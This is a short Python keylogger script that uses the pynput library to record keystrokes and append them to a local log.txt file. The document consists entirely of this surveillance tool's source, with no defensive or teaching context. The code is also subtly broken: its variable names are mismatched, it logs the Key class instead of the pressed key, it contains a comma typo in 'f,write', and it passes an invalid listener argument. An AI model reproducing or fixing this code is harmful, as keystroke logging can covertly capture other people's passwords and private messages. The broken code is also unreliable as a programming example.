import pynput
from pynput.keyboard import Key, Listener

count = 0
key = []

def on_press(key):
    global keys, count
    keys.append(Key)
    count = count + 1
    print("{0} Pressed".format(Key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open('log.txt', 'a') as f:
        for Key in keys:
            k = str(Key).replace("'", "")
            if k.find("space")>0:
                f.write("\n")
            elif k.find("Key") == -1:
                f,write(k)

def onRelease(Key):
    if Key == Key.esc:
        return False

with Listener(on_press=on_press, onRelease=onRelease) as listener:
    listener.join()


